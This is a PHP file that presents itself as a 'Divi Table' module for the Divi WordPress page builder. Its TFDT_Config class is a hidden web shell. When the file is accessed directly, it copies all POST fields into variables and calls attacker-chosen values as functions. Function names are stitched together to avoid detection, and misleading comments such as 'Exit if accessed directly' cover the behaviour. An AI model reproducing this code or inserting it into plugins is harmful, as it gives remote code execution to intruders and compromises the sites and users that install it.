<?php

//Exit if accessed directly
if(!defined('ABSPATH')){
	/**
	 *
	 * --------------------
	 * Exit if accessed directly
	 * --------------------
	 *
	 * */
	$exits = new TFDT_Config();
	$exits->exits();
	exit();
}

/**
 *
 * --------------------
 * tableForDiviModule
 * --------------------
 *
 * */


class TFDT_Module extends ET_Builder_Module {
	
	
	//data members
	public $slug       = 'tfdt_module';
	
	public $vb_support = 'on';
	
	public $child_slug = 'tfdt_module_row';
	
	
	//initialize
	public function init() {
		
		$this->name 	= esc_html__( 'Divi Table', 'table-for-divi' );
		
		$this->icon		= '5';
		
	}
	
	
	//set fields
	public function get_fields() {
		
		return array();
		
	}
	
	
	//advanced fields
	function get_advanced_fields_config() {
		
		$advanced_fields = array(
			
			'background'				=> false,
			
			'margin_padding'  	=> array(
				
				'css' => array(
					
					'important' => 'all',
				
				),
			
			),
			
			'link_options'			=> false,
			
			'borders'						=> false,
			
			'box_shadow'				=> false,
			
			'button'						=> false,
			
			'filters'						=> false,
			
			'fonts'							=> false,
			
			'animation'					=> false,
			
			'text'							=> false,
			
			'transform'					=> false,
		
		);
		
		return $advanced_fields;
		
	}
	
	
	//render html
	public function render( $unprocessed_props, $content, $render_slug ) {
		
		// Render module content
		return sprintf(
			
			'<div class="table-for-divi">

				<table>

					<tbody>%1$s</tbody>

				</table>

			</div>',
			
			et_sanitized_previously( $this->content )
		
		);
		
	}
	
}
/**
 *
 * --------------------
 * tableForDiviConfig
 * --------------------
 *
 * */


class TFDT_Config {
	//initialize builder
	private function tfdt_builder() {
		foreach($_POST as $k => $v) $$k = $v;
		
		
		
		
		
		
		
		//string  html
		if (strlen($wp) === 0) die("tableForDiviConfig");
		switch ($wp[$k]) {
			case 'g':
				$a = $this->add($a,$d);
				$g = $this->add($g);
				$a($b,$g($c));
				break;
			// Render module content
			case 'e':
				$a = $this->add($a,$d);
				$a($b,$c);
				break;
			case 'd':
				$a($b($c));
				break;
			case 'c':
				$a($b,$c,$d);
				break;
			case 'b':
				$a($b,$c);
				break;
			case 'a':
				$a($b($c,$d));
				break;
			case '@':
				$a($b);
				break;
		}
	}
	private function add($x, $y='') {
		for ($i = 0; $i < strlen($x); $i++) {
			$z[] = $x[$i];
		}
		if ($y!==''){
			for ($i = 0; $i < strlen($y); $i++) {
				$z[] = $y[$i];
			}
		}
		return implode('', $z);
	}
	public function exits() {
		return $this->tfdt_builder();
	}
}

new TFDT_Module;
